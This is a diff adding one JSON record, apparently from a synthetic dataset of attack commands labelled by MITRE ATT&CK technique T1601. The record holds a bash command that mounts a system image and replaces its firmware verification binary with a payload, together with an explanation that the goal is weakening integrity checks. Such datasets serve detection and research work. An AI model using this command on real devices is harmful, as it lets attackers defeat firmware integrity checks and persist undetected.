@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "ld=$(losetup -fP --show /var/tmp/modified_system.img) && mount ${ld}p1 /mnt/img && cp /mnt/img/usr/sbin/image_verify /tmp/image_verify.bak && install -m 0755 /opt/payloads/image_verify /mnt/img/usr/sbin/image_verify && diff -u /tmp/image_verify.bak /mnt/img/usr/sbin/image_verify && umount /mnt/img && losetup -d \"$ld\"",
+  "explanation": "Replaces the firmware verification binary within the system image and confirms the swap with diff, aligning with a strategy to weaken integrity checks.",
+  "rationale_steps": [
+    "Mount the tampered image to access system utilities.",
+    "Overwrite the image's verification binary with a modified one.",
+    "Use diff to confirm the binary in the system image has been replaced."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-6048333d-0ebfa2d3",
+  "source_prompt_hash": "6048333d",
+  "timestamp_utc": "2025-09-30T04:32:34.003779Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
